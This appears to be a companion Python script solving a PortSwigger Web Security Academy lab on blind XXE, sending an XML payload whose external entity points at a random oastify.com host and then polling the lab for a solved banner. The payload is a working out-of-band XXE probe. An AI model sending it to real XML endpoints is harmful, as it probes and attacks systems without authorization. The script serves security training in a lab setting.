#!/usr/bin/env python3
"""
Blind XXE with out-of-band interaction
PortSwigger Web Security Academy -- XXE Injection

Companion script for the writeup: 03-blind-xxe-with-out-of-band-interaction.md

What this does:
    Sends a DOCTYPE declaring a regular general external entity whose SYSTEM
    identifier is a random subdomain under *.oastify.com -- the same wildcard
    domain Burp Collaborator's default public instance uses, which
    PortSwigger's own lab backend watches independently of the Collaborator
    client. We never read an interaction log; we just need the server to
    resolve the entity and make the outbound request, then poll the lab's own
    home page for the "Congratulations" banner the platform flips once it
    sees the callback. No Burp Suite Professional required for this lab.

Usage:
    python 03-blind-xxe-with-out-of-band-interaction.py <lab-url>

Requirements:
    pip install httpx
"""

import secrets
import sys
import time
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15, verify=False)

    token = secrets.token_hex(16)
    oast = f"http://{token}.oastify.com"
    print(f"[*] OAST URL: {oast}")

    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "{oast}">\n]>'
        '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    )
    r = client.post(
        f"{lab_url}/product/stock",
        content=payload,
        headers={"Content-Type": "application/xml"},
    )
    print(f"[*] Sent OOB payload: status={r.status_code}")

    print("[*] Waiting for the platform to auto-detect the interaction...")
    for i in range(12):
        time.sleep(10)
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print(f"[+] Lab solved -- outbound interaction confirmed after ~{(i + 1) * 10}s.")
            return
        print(f"    still waiting ({(i + 1) * 10}s)...")

    print("[-] Not solved after 120s. Try re-running -- OAST callbacks can be delayed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
